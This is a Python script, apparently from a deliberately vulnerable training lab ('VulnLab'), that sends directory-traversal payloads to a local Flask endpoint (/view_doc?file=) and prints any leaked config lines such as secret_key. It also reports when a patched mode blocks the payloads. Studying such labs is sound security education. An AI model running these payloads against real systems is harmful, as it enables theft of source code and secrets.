import requests

BASE_URL = "http://127.0.0.1:5000"

def attack():
    print("="*60)
    print("      DIRECTORY TRAVERSAL & LFI ATTACK SCRIPT      ")
    print("="*60)
    
    session = requests.Session()
    
    # Target files to extract via directory climbing from docs/
    payloads = [
        "../config.py",
        "../app.py",
        "../requirements.txt",
        "../../VulnLab/config.py"
    ]
    
    for payload in payloads:
        target_url = f"{BASE_URL}/view_doc?file={payload}"
        print(f"\n[+] Testing Traversal Payload: {payload}")
        print(f"    URL: {target_url}")
        
        resp = session.get(target_url)
        
        if "VULN_MODE" in resp.text or "Flask(__name__)" in resp.text or "Flask==" in resp.text:
            print("[!] SUCCESS! Directory Traversal Confirmed.")
            print("--- SENSITIVE FILE LEAK EXCERPT ---")
            lines = [line.strip() for line in resp.text.split('\n') if "VULN_MODE" in line or "secret_key" in line or "Flask==" in line]
            for l in lines[:5]:
                print(f"    {l}")
            print("-----------------------------------")
        elif "Directory Traversal sequence" in resp.text or "Access Denied" in resp.text:
            print("[-] Defense Active: The application rejected the traversal sequence! (Patched Mode)")
        else:
            print("[-] Failed to retrieve file content.")

if __name__ == '__main__':
    attack()
